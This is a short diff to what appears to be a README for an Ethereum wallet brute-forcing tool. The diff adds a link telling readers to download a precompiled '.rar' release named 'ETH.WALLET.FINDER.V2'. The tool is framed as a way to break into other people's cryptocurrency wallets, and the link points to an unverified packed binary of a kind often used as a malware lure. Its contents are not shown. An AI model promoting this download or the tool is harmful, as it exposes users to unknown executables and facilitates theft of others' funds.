@@ -9,7 +9,7 @@
 
 # How to Run ?
 
- U can Downlaod precompiled version ,Easy to run
+ U can Downlaod precompiled version ,Easy to run https://github.com/F-a-b-l-e/ETH-Wallet-Brute-V2/releases/download/ETH/ETH.WALLET.FINDER.V2.rar
 
 Or compile u own by :
 
